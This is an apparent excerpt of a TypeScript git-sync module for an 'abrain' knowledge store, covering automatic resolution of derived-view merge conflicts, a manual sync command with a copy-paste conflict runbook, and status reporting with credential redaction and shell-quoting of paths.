 * divergent auto-merge conflicted and EVERY unmerged path is under a derived
 * L2 view (l2/views/knowledge or l2/views/constraint). Content-addressed L1
 * events are disjoint and merge cleanly, so they are already staged; the only
 * conflicts are in derived views, and resolving them here turns a multi-device
 * auto-sync stall into a self-heal.
 *
 * Returns true ONLY on full success. On ANY failure it returns false WITHOUT
 * committing, so the caller's `merge --abort` cleanly restores the pre-merge
 * tree (no dirty L2 is ever committed/pushed).
 *
 * Two derived views, two strategies (T0 panel, context-complete decision):
 *
 *  - Knowledge L2 is a DETERMINISTIC fold of L1 (topo projection). The correct
 *    post-merge view IS reproject(merged L1) — a pure function, NOT a cognitive
 *    merge — so we recompute it. An LLM here would only add hallucination to a
 *    deterministic answer.
 *
 *  - Constraint L2 is an LLM SYNTHESIS over the rules corpus, so a truly
 *    merged-correct view would need a fresh LLM compile over the merged rules
 *    — which must NEVER run in the deterministic, fail-fast sync path (it would
 *    make startup/sync block on, and fail with, LLM availability). But the
 *    constraint compiled-view is a self-correcting audit SHADOW: runtime rule
 *    injection reads each device's LOCAL .state/sediment/constraint-shadow,
 *    and ADR 0039 §6 accepts staleness. So we only UNBLOCK git mechanically —
 *    adopt the incoming side (`checkout --theirs`, converging toward the shared
 *    remote) — and the LLM still owns the real merge ASYNCHRONOUSLY, via the
 *    constraint compiler's next auto-refresh over the merged rules. The
 *    mechanical step is pure transport-unblock, not a cognitive decision.
 */
async function resolveDerivedL2ConflictAndCommit(opts: GitSyncOptions, timeoutMs: number, mergeMsg: string, conflictPaths: string[]): Promise<boolean> {
  try {
    const knowledgeConflicts = conflictPaths.filter((p) => p.startsWith("l2/views/knowledge/"));
    const constraintConflicts = conflictPaths.filter((p) => p.startsWith("l2/views/constraint/"));

    if (knowledgeConflicts.length > 0) {
      const { reprojectAllKnowledge } = await import("../sediment/knowledge-evidence");
      const r = await reprojectAllKnowledge({
        abrainHome: opts.abrainHome,
        settings: { knowledgeProjector: { l2OutputRoot: "repo" } },
      });
      if (r.failed > 0) return false;
      const reprojected = r.writtenPaths
        .map((filePath: string) => path.relative(opts.abrainHome, filePath).split(path.sep).join("/"))
        .filter((rel: string) => rel && !rel.startsWith("..") && !path.isAbsolute(rel))
        .filter((rel: string) => rel !== "l2/views/knowledge/latest/manifest.json");
      if (reprojected.length === 0) return false;
      // Reproject overwrote the conflict-markered entries with the correct
      // topo-fold; stage only the files this projector actually wrote/removed.
      await execFileAsync(
        "git", ["-C", opts.abrainHome, "add", "-A", "--", ...reprojected],
        { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
      );
    }

    if (constraintConflicts.length > 0) {
      // Mechanical unblock only (no LLM in the sync path): adopt the incoming
      // (origin) rendered view for each conflicted constraint path, then stage
      // it. Stale-but-consistent shadow; the async constraint compiler produces
      // the merged-correct view on its next run over the merged rules.
      for (const p of constraintConflicts) {
        await execFileAsync(
          "git", ["-C", opts.abrainHome, "checkout", "--theirs", "--", p],
          { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
        );
      }
      await execFileAsync(
        "git", ["-C", opts.abrainHome, "add", "--", ...constraintConflicts],
        { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
      );
    }

    // Defensive: every conflict must now be resolved. `-z` + NUL split (matches
    // the conflictPaths capture) so a path with a newline can't false-negative.
    const { stdout: stillUnmerged } = await execFileAsync(
      "git", ["-C", opts.abrainHome, "diff", "-z", "--name-only", "--diff-filter=U"],
      { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
    );
    if (stillUnmerged.split("\0").filter(Boolean).length > 0) return false;
    // Conclude the merge as one commit carrying the resolved L2.
    await execFileAsync(
      "git",
      [
        "-C", opts.abrainHome,
        "-c", "user.name=abrain-autosync",
        "-c", "user.email=autosync@abrain.local",
        "-c", "commit.gpgsign=false",
        "commit", "--no-gpg-sign", "-m", mergeMsg,
      ],
      { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: MERGE_ENV },
    );
    return true;
  } catch {
    return false;
  }
}

/**
 * Manual /abrain sync slash command driver. fetch+ff/auto-merge first,
 * then push. Returns a human-readable summary string for `ui.notify`
 * and the raw events for audit/inspection.
 *
 * If fetch returns `conflict` (auto-merge hit an unresolvable textual
 * conflict and was aborted), we skip push and surface a runbook with
 * the conflicting paths.
 */
export async function sync(opts: GitSyncOptions): Promise<{
  events: GitSyncEvent[];
  ok: boolean;
  summary: string;
}> {
  if (canonicalGitRuntimeEnabled()) {
    const started = Date.now();
    const event: GitSyncEvent = { ts: new Date().toISOString(), op: "sync", result: "failed", details: { canonicalGitRuntime: true } };
    try {
      const runtime = await getCanonicalGitRuntime({ abrainHome: opts.abrainHome });
      const startup = await runtime.awaitStartup();
      if (startup.startup !== "ready") {
        event.reason = "canonical_startup_blocked";
        event.error = startup.blockedReason ?? "canonical startup barrier is not ready";
      } else {
        await runtime.recoverAtStartup();
        const backlog = await runtime.requestBacklogPreflight();
        if (backlog.status === "blocked") {
          event.reason = "canonical_backlog_blocked";
          event.error = backlog.reason ?? "canonical backlog ownership preflight blocked";
        } else {
          if (backlog.status === "ready") {
            const drained = await runtime.requestDrain(backlog.receipts, "abrain: manual canonical backlog drain");
            if (drained.status !== "index_converged" && drained.status !== "empty") {
              event.reason = `canonical_drain_${drained.status}`;
              event.error = drained.reason ?? `canonical drain ended in ${drained.status}`;
            }
          }
          if (!event.error) {
            const pushed = await runtime.requestPush();
            const remote = pushed.status === "success" ? await runtime.verifyRemoteConvergence(pushed.targetCommit) : null;
            event.details = { canonicalGitRuntime: true, push: pushed, remote };
            event.ahead = remote?.ahead;
            event.behind = remote?.behind;
            if (pushed.status !== "success") {
              event.result = "failed";
              event.reason = pushed.reason ?? `canonical_push_${pushed.status}`;
              event.error = pushed.reason ?? `canonical push ended in ${pushed.status}`;
            } else if (!remote || remote.status !== "ready" || !remote.remoteContained || remote.ahead !== 0 || remote.behind !== 0) {
              event.result = "failed";
              event.reason = `canonical_remote_${remote?.status ?? "blocked"}`;
              event.error = remote?.reason ?? "canonical remote is not exact-converged";
            } else {
              event.result = "ok";
              event.reason = "canonical_remote_converged";
            }
          }
        }
      }
    } catch (error) {
      event.reason = (error as { code?: string })?.code ?? "canonical_sync_threw";
      event.error = redactCredentials(error instanceof Error ? error.message : String(error)).slice(0, 500);
    }
    event.durationMs = Date.now() - started;
    await audit(opts.abrainHome, event);
    return {
      events: [event],
      ok: event.result === "ok",
      summary: event.result === "ok"
        ? `synced via canonical facade: ${event.result}`
        : `canonical sync blocked (${event.reason ?? event.result}): ${event.error ?? "unknown"}`,
    };
  }

  const fetchEvent = await fetchAndFF(opts);

  if (fetchEvent.result === "conflict") {
    // Round 2 audit fix (opus M2): the runbook contains `cd <path>` that
    // users will copy/paste into a shell. If abrainHome contained shell
    // metacharacters (via ABRAIN_ROOT env injection from an earlier
    // compromised process), pasting would execute arbitrary code. Two
    // defenses:
    //   1. POSIX shell-quote the path so any quote/$/;/etc is literal.
    //   2. If the path contains a newline or control char, refuse the
    //      inline form and tell the user to cd manually.
    const quotedHome = shellQuotePath(opts.abrainHome);
    const paths = fetchEvent.conflictPaths || [];
    const pathsLine =
      paths.length > 0
        ? `conflicting files (${paths.length}): ${paths.slice(0, 10).join(", ")}${paths.length > 10 ? ", ..." : ""}\n`
        : "";
    const summary =
      `conflict: auto-merge of ${fetchEvent.behind} remote commit(s) into ${fetchEvent.ahead} local commit(s) failed.\n` +
      pathsLine +
      `working tree restored (merge --abort). resolve manually:\n` +
      `  cd ${quotedHome}\n` +
      `  git fetch origin && git merge origin/main   # then resolve conflicts in your editor\n` +
      `  git add <resolved files> && git commit       # finish the merge\n` +
      `  # then run /abrain sync again to push`;
    return { events: [fetchEvent], ok: false, summary };
  }

  if (
    fetchEvent.result !== "ok" &&
    fetchEvent.result !== "noop" &&
    fetchEvent.result !== "skipped"
  ) {
    return {
      events: [fetchEvent],
      ok: false,
      summary: `fetch failed (${fetchEvent.result}): ${fetchEvent.error || "unknown"}`,
    };
  }

  const pushEvent = await pushAsync(opts);

  const ok =
    pushEvent.result === "ok" ||
    pushEvent.result === "noop" ||
    pushEvent.result === "skipped";
  const pushedHint = pushEvent.result === "ok" && pushEvent.ahead
    ? ` (${pushEvent.ahead} commit(s) pushed)` : "";

  const mergedHint =
    fetchEvent.result === "ok" && fetchEvent.merged && fetchEvent.merged > 0
      ? ` (auto-merged ${fetchEvent.merged} commit(s) from origin/main)`
      : "";
  const summary = ok
    ? `synced: fetch=${fetchEvent.result}${mergedHint}, push=${pushEvent.result}${pushedHint}`
    : `fetch=${fetchEvent.result}, push=${pushEvent.result}: ${pushEvent.error || "unknown"}`;

  return { events: [fetchEvent, pushEvent], ok, summary };
}

/**
 * Snapshot of current sync state for /abrain status command.
 * Read-only — does not invoke git fetch.
 */
export interface AbrainSyncStatus {
  isGitRepo: boolean;
  remote?: string;
  branch?: string;
  ahead: number;
  behind: number;
  lastPush?: GitSyncEvent;
  lastFetch?: GitSyncEvent;
  consecutivePushBlockedReconcile?: number;
}

export async function getStatus(abrainHome: string): Promise<AbrainSyncStatus> {
  if (!existsSync(path.join(abrainHome, ".git"))) {
    return { isGitRepo: false, ahead: 0, behind: 0 };
  }

  const status: AbrainSyncStatus = { isGitRepo: true, ahead: 0, behind: 0 };

  try {
    const { stdout } = await execFileAsync(
      "git",
      ["-C", abrainHome, "remote", "get-url", "origin"],
      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
    );
    // Round 2 audit fix (opus M1 + deepseek m2): redact userinfo so a
    // remote like https://alice:tok@host/repo never appears in /abrain
    // status output or status.remote consumers.
    status.remote = redactCredentials(stdout.trim());
  } catch {
    // no remote — leave undefined
  }

  try {
    const { stdout } = await execFileAsync(
      "git",
      ["-C", abrainHome, "branch", "--show-current"],
      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
    );
    status.branch = stdout.trim() || undefined;
  } catch {
    // no branch (detached HEAD?) — leave undefined
  }

  if (status.remote) {
    const ab = await getAheadBehind(abrainHome);
    status.ahead = ab.ahead;
    status.behind = ab.behind;
  }

  // Tail the audit log to find the most recent push and fetch events.
  // Bounded read (last 200 KB) so a huge audit file doesn't slow status.
  try {
    const auditPath = path.join(abrainHome, ".state", "git-sync.jsonl");
    const handle = await fs.open(auditPath, "r");
    try {
      const stats = await handle.stat();
      const readSize = Math.min(stats.size, 200 * 1024);
      const offset = stats.size - readSize;
      const buf = Buffer.alloc(readSize);
      await handle.read(buf, 0, readSize, offset);
      const text = buf.toString("utf-8");
      const lines = text.trim().split("\n").reverse();
      let countingBlockedPushes = true;
      let consecutiveBlocked = 0;
      for (const line of lines) {
        try {
          const ev = JSON.parse(line) as GitSyncEvent;
          if (ev.op === "push") {
            if (!status.lastPush) status.lastPush = ev;
            if (countingBlockedPushes && ev.result === "push_blocked_reconcile") consecutiveBlocked += 1;
            else countingBlockedPushes = false;
          }
          if (ev.op === "fetch" && !status.lastFetch) status.lastFetch = ev;
          if (status.lastPush && status.lastFetch && !countingBlockedPushes) break;
        } catch {
          // skip malformed audit lines
        }
      }
      status.consecutivePushBlockedReconcile = consecutiveBlocked;
    } finally {
      await handle.close();
    }
  } catch {
    // no audit yet — leave lastPush/lastFetch undefined
  }

  return status;
}

/**
 * Format AbrainSyncStatus as a multi-line string for /abrain status output.
 * Pure formatter — separated so it can be unit tested without touching git.
 */
export function formatSyncStatus(status: AbrainSyncStatus): string {
  if (!status.isGitRepo) {
    return "abrain repo: not a git repo (auto-sync inactive)";
  }
  const lines: string[] = [];
  lines.push(`abrain git sync (ADR 0020):`);
  lines.push(`  remote: ${status.remote || "(none — auto-sync inactive)"}`);
  if (status.branch) lines.push(`  branch: ${status.branch}`);
  if (status.remote) {
    lines.push(`  ahead:  ${status.ahead}${status.ahead > 0 ? " (run /abrain sync to push)" : ""}`);
    lines.push(`  behind: ${status.behind}${status.behind > 0 ? " (run /abrain sync to pull/auto-merge)" : ""}`);
  }
  const fmtEvent = (label: string, ev?: GitSyncEvent): string => {
    if (!ev) return `  last ${label}: (none recorded)`;
    const dur = ev.durationMs != null ? ` ${ev.durationMs}ms` : "";
    const err = ev.error ? ` — ${ev.error.split("\n")[0].slice(0, 80)}` : "";
    return `  last ${label}: ${ev.ts} ${ev.result}${dur}${err}`;
  };
  lines.push(fmtEvent("push", status.lastPush));
  lines.push(fmtEvent("fetch", status.lastFetch));
  if ((status.consecutivePushBlockedReconcile ?? 0) >= 3) {
    lines.push(`  ⚠ ADR0039 push gate has blocked ${status.consecutivePushBlockedReconcile} consecutive push attempts; run reconcile/reproject before expecting auto-sync to recover`);
  }
  // 2026-05-17: ahead+behind>0 is no longer a steady state — fetchAndFF
  // auto-merges. If it persists, it means the most recent fetch hit a
  // textual conflict (last fetch result === 'conflict'); surface that
  // signal precisely rather than the old generic 'diverged' line.
  if (status.lastFetch?.result === "conflict") {
    lines.push("  ⚠ last fetch hit a merge conflict — run /abrain sync for runbook");
  } else if (status.ahead > 0 && status.behind > 0) {
    // Transient: pre-auto-merge state (haven't fetched yet this session).
    lines.push("  ⓘ diverged — run /abrain sync to auto-merge");
  }
  return lines.join("\n");
}
